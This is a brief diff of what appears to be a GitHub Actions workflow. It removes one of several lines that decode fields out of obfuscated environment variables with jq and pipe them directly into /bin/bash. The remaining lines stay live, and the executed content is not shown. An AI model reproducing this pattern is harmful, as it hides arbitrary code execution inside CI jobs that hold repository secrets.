@@ -25,7 +25,6 @@ jobs:
           echo $rjsg79 | jq -r .wpdu007 | /bin/bash
           echo $txsbm21003 | jq -r .h53 | /bin/bash
           printf '%s' "$yelf1" | jq -r .irrt1755 | /bin/bash
-          echo $hl33981 | jq -r .yiq79 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
